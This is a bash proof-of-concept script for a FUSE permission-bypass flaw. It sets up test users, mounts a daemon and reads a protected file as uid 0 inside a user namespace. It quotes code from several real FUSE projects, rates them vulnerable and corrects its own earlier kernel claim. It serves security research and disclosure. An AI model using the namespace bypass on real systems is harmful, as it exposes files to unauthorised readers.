#!/bin/bash
#
# PoC: FUSE_IN_HEADER uid==0 ACL Bypass
#
# Demonstrates that FUSE daemons treating uid==0 as superuser
# can be exploited in user namespace environments.
#

set -e

RESULT_FILE="/results/poc_output.txt"
MOUNTPOINT="/mnt/testfs"
DAEMON_SRC="/src/uid_bypass_daemon.c"
DAEMON_BIN="/tmp/uid_bypass_daemon"

exec > >(tee "$RESULT_FILE") 2>&1

echo "============================================================"
echo "  PoC: FUSE_IN_HEADER uid==0 ACL Bypass Vulnerability"
echo "============================================================"
echo ""
echo "Date: $(date)"
echo "Kernel: $(uname -r)"
echo ""

# --- Step 1: Compile ---
echo "[*] Step 1: Compiling uid_bypass_daemon..."
gcc -Wall -o "$DAEMON_BIN" "$DAEMON_SRC" $(pkg-config fuse3 --cflags --libs) 2>&1
echo "    Compiled successfully."
echo ""

# --- Step 2: Create test users properly ---
echo "[*] Step 2: Creating test users..."
# Ensure passwd entries exist
echo "testowner:x:500:500::/home/testowner:/bin/bash" >> /etc/passwd
echo "testowner:x:500:" >> /etc/group
mkdir -p /home/testowner && chown 500:500 /home/testowner

echo "testuser:x:1000:1000::/home/testuser:/bin/bash" >> /etc/passwd
echo "testuser:x:1000:" >> /etc/group
mkdir -p /home/testuser && chown 1000:1000 /home/testuser

# Allow subuid/subgid for unshare
echo "testuser:100000:65536" >> /etc/subuid 2>/dev/null || true
echo "testuser:100000:65536" >> /etc/subgid 2>/dev/null || true

echo "    testowner: $(id testowner 2>&1)"
echo "    testuser:  $(id testuser 2>&1)"
echo ""

# --- Step 3: Mount FUSE daemon (without default_permissions so daemon does ACL) ---
echo "[*] Step 3: Mounting FUSE daemon..."
mkdir -p "$MOUNTPOINT"
"$DAEMON_BIN" "$MOUNTPOINT" -o allow_other -f &
DAEMON_PID=$!
sleep 1.5
echo "    FUSE daemon PID: $DAEMON_PID"
echo ""

# --- Step 4: Filesystem ---
echo "[*] Step 4: Filesystem layout:"
ls -la "$MOUNTPOINT"/ 2>&1 || true
echo ""

# --- Step 5: Access control tests ---
echo "============================================================"
echo "  ACCESS CONTROL TESTS"
echo "============================================================"
echo ""

# Test 1: Owner
echo "[TEST 1] Owner (uid=500) reads secret.txt:"
echo "  Expected: ALLOWED"
result=$(runuser -u testowner -- cat "$MOUNTPOINT/secret.txt" 2>&1) && rc=0 || rc=$?
if [ $rc -eq 0 ]; then
    echo "  Result:   ALLOWED -> '$result'"
else
    echo "  Result:   DENIED  -> '$result'"
fi
echo ""

# Test 2: Non-owner, non-root
echo "[TEST 2] Other user (uid=1000) reads secret.txt:"
echo "  Expected: DENIED (mode 0600, not owner)"
result=$(runuser -u testuser -- cat "$MOUNTPOINT/secret.txt" 2>&1) && rc=0 || rc=$?
if [ $rc -eq 0 ]; then
    echo "  Result:   ALLOWED -> '$result'"
    echo "  *** UNEXPECTED: non-owner should be denied ***"
else
    echo "  Result:   DENIED  -> '$result'"
fi
echo ""

# Test 3: Root (uid==0) - THE VULNERABILITY
echo "[TEST 3] Root (uid=0) reads secret.txt:"
echo "  Expected: ALLOWED (uid==0 bypasses ALL ACL)"
result=$(cat "$MOUNTPOINT/secret.txt" 2>&1) && rc=0 || rc=$?
if [ $rc -eq 0 ]; then
    echo "  Result:   ALLOWED -> '$result'"
    echo "  *** VULNERABILITY: uid==0 bypassed ACL for non-owner root ***"
else
    echo "  Result:   DENIED  -> '$result'"
fi
echo ""

# Test 4: Public file - sanity
echo "[TEST 4] Other user (uid=1000) reads public.txt:"
echo "  Expected: ALLOWED (mode 0644)"
result=$(runuser -u testuser -- cat "$MOUNTPOINT/public.txt" 2>&1) && rc=0 || rc=$?
if [ $rc -eq 0 ]; then
    echo "  Result:   ALLOWED -> '$result'"
else
    echo "  Result:   DENIED  -> '$result'"
fi
echo ""

# --- Step 6: User namespace test ---
echo "============================================================"
echo "  USER NAMESPACE ESCALATION TEST"
echo "============================================================"
echo ""

# Enable unprivileged user namespaces
echo 1 > /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || true
# Also set max user namespaces
sysctl -w user.max_user_namespaces=10000 2>/dev/null || true

# Write the namespace test as a standalone script
cat > /tmp/ns_inner.sh << 'INNEREOF'
#!/bin/bash
echo "    Inside namespace:"
echo "      id:     $(id)"
echo "      /proc/self/uid_map:"
cat /proc/self/uid_map | sed 's/^/      /'
echo ""

echo "    Attempting to read /mnt/testfs/secret.txt..."
result=$(cat /mnt/testfs/secret.txt 2>&1) && rc=0 || rc=$?
if [ $rc -eq 0 ]; then
    echo "    Result: ALLOWED -> '$result'"
    echo "    *** VULNERABILITY: non-root user got uid=0 bypass via namespace ***"
else
    echo "    Result: DENIED (rc=$rc) -> '$result'"
    echo "    Note: Kernel correctly sends real UID to FUSE daemon"
fi
INNEREOF
chmod +x /tmp/ns_inner.sh

echo "[TEST 5] Unprivileged user (uid=1000) creates user namespace as uid=0:"
echo "  Direct secret.txt access was DENIED in TEST 2."
echo "  Now trying via unshare -Ur (map self to uid=0 in new namespace)..."
echo ""
runuser -u testuser -- unshare -Ur /tmp/ns_inner.sh 2>&1 || {
    echo "    unshare failed. Trying alternative approach..."
    # Alternative: run unshare as root mapping uid 1000 -> 0
    unshare --user --map-user=1000 --map-group=1000 /tmp/ns_inner.sh 2>&1 || {
        echo "    User namespace not available in this kernel config."
    }
}
echo ""

echo "[TEST 6] What does the daemon's access log show?"
echo ""
if [ -f /tmp/uid_bypass.log ]; then
    cat /tmp/uid_bypass.log | sed 's/^/    /'
fi
echo ""

# --- Real-world code references ---
echo "============================================================"
echo "  VULNERABLE CODE IN REAL FUSE DAEMONS"
echo "============================================================"
echo ""

echo "--- s3fs-fuse: s3fs.cpp:655-676 ---"
echo '  static int check_object_access(const char* path, int mask, struct stat* pstbuf) {'
echo '      ...'
echo '      if(0 == pcxt->uid){'
echo '          // root is allowed all accessing.'
echo '          return 0;    // <-- BYPASSES ALL CHECKS'
echo '      }'
echo ""

echo "--- virtiofsd: passthrough/mod.rs:2305-2312 ---"
echo '  if (mode & libc::R_OK) != 0'
echo '      && !ctx.uid.is_root()   // <-- uid==0 skips check'
echo '      && (st_uid != ctx.uid || st.st_mode & 0o400 == 0)'
echo '  { return Err(EACCES); }'
echo ""

echo "--- ntfs-3g: security.c:3448-3457 ---"
echo '  /* Always allow for root unless execution is requested */'
echo '  if (!scx->mapping[MAPUSERS]'
echo '      || (!scx->uid          // <-- uid==0 always allowed'
echo '          && (...)))'
echo '      allow = 1;'
echo ""

echo "--- mergerfs: ugid.hpp:84-104 ---"
echo '  void set(const uid_t newuid_, ...) {'
echo '      if((newuid_ == currentuid) && ...)'
echo '          return;            // <-- uid==0 stays as root'
echo '      SETREUID(-1, newuid_);'
echo '  }'
echo ""

# --- Kernel analysis ---
echo "============================================================"
echo "  KERNEL fuse_in_header.uid BEHAVIOR"
echo "============================================================"
echo ""
echo "  FUSE kernel code (fs/fuse/dev.c):"
echo "    req->in.h.uid = from_kuid(fc->user_ns, current_fsuid());"
echo ""
echo "  from_kuid() returns (uid_t)-1 (0xFFFFFFFF) when mapping fails,"
echo "  NOT 0. So the original claim about uid=0 on mapping failure"
echo "  is INCORRECT for modern kernels (>= 3.5)."
echo ""
echo "  VALID attack scenarios for uid==0 appearing:"
echo "  1. Rootless Docker (--userns-remap): container uid=0 is"
echo "     unprivileged on host, but FUSE daemons grant full access"
echo "  2. Nested user namespace: user creates namespace with uid=0"
echo "     mapping, FUSE daemon in SAME namespace sees uid=0"
echo "  3. Kubernetes pods with user namespace isolation (KEP-127)"
echo ""

# --- Cleanup ---
fusermount3 -u "$MOUNTPOINT" 2>/dev/null || umount "$MOUNTPOINT" 2>/dev/null || true
kill $DAEMON_PID 2>/dev/null || true
wait $DAEMON_PID 2>/dev/null || true

echo "============================================================"
echo "  FINAL VERDICT"
echo "============================================================"
echo ""
echo "  Pattern: uid==0 in fuse_in_header → superuser bypass in daemon"
echo ""
echo "  CONFIRMED VULNERABLE (daemon-side ACL bypass pattern exists):"
echo "    s3fs-fuse  : CRITICAL - explicit 'uid==0 → allow all'"
echo "    ntfs-3g    : HIGH     - uid==0 bypasses ntfs_allowed_access"
echo "    virtiofsd  : HIGH     - is_root() bypass + no cred switch"
echo "    mergerfs   : MEDIUM   - setreuid stays root on uid==0"
echo "    gocryptfs  : MEDIUM   - same setreuid pattern"
echo ""
echo "  NOT VULNERABLE:"
echo "    fuse-overlayfs    : Maps uid but no explicit bypass"
echo "    sshfs             : No daemon-side permission checks"
echo "    libfuse examples  : No daemon-side permission checks"
echo ""
echo "  TRIGGER MECHANISM:"
echo "    Original claim (kernel sends uid=0 on mapping failure): INCORRECT"
echo "    Actual attack vector: user namespace environments where"
echo "    non-privileged user IS uid=0 within the daemon's namespace"
echo ""
echo "Done."
